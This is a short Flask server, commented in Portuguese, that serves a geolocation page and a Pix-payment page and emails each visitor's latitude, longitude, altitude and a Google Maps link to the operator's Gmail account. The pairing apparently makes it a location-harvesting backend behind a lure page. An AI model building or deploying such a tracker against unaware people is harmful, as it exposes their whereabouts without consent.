from flask import Flask, request, jsonify
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

app = Flask(__name__)

# Configurações de email - você precisa preencher estas informações
EMAIL_REMETENTE = "seu-email@gmail.com"  # Substitua com seu email
EMAIL_SENHA = "sua-senha-de-app"  # Substitua com sua senha de aplicativo
EMAIL_DESTINATARIO = "seu-email@gmail.com"  # Substitua com o email que receberá as localizações

@app.route('/')
def home():
    return app.send_static_file('geolocalizacao.html')

@app.route('/pix')
def pix():
    return app.send_static_file('pix.html')

@app.route('/enviar-localizacao', methods=['POST'])
def enviar_localizacao():
    dados = request.json
    
    # Criar mensagem
    msg = MIMEMultipart()
    msg['From'] = EMAIL_REMETENTE
    msg['To'] = EMAIL_DESTINATARIO
    msg['Subject'] = "Nova Localização Recebida"
    
    corpo = f"""
    Nova localização recebida:
    
    Latitude: {dados['latitude']}
    Longitude: {dados['longitude']}
    Altitude: {dados['altitude']}
    
    Link do Google Maps:
    https://www.google.com/maps?q={dados['latitude']},{dados['longitude']}
    """
    
    msg.attach(MIMEText(corpo, 'plain'))
    
    try:
        # Configurar servidor SMTP (exemplo usando Gmail)
        servidor = smtplib.SMTP('smtp.gmail.com', 587)
        servidor.starttls()
        servidor.login(EMAIL_REMETENTE, EMAIL_SENHA)
        
        # Enviar email
        texto = msg.as_string()
        servidor.sendmail(EMAIL_REMETENTE, EMAIL_DESTINATARIO, texto)
        servidor.quit()
        
        return jsonify({"mensagem": "Localização enviada com sucesso!"}), 200
    except Exception as e:
        print(f"Erro ao enviar email: {str(e)}")
        return jsonify({"erro": "Erro ao enviar localização"}), 500

if __name__ == '__main__':
    app.run(debug=True)
